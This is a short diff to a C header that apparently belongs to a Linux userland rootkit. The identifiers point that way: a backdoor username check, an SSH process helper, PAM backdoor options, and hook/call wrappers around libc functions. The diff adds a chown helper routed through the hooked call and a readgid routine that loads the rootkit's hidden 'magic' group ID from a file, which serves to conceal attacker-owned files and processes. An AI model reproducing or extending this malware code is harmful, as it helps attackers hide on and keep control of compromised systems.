@@ -9,7 +9,7 @@
 #define NAME_MAXLEN       128     /* max lengths for storing process name */
 #define CMDLINE_MAXLEN    512     /* & cmdline string. */
 
-#define PID_MAXLEN      16      /* maximum length a pid can be */
+#define PID_MAXLEN      30      /* max length in bytes a pid can be */
 #define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN
 
 #define MODE_NAME     0x01   /* defined modes for determining whether */
@@ -34,6 +34,20 @@ int bd_sshproc(void);
 #include "processes.c"
 
 #define isbduname(name) !strncmp(BD_UNAME, name, strlen(BD_UNAME))
+
+int chown_path(char *path, gid_t gid){
+    hook(CCHOWN);
+    return (long)call(CCHOWN, path, 0, gid);
+}
+
+/* if the toggle for this functionality isn't enabled, readgid()
+ * just returns MAGIC_GID. */
+#ifdef READ_GID_FROM_FILE
+#define GID_PATH "??GID_PATH??" // [READ_GID_FROM_FILE]
+int changerkgid(gid_t *new);
+#endif
+gid_t readgid(void);
+#include "readgid.c"
 
 /* if PAM is being used... */
 #if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
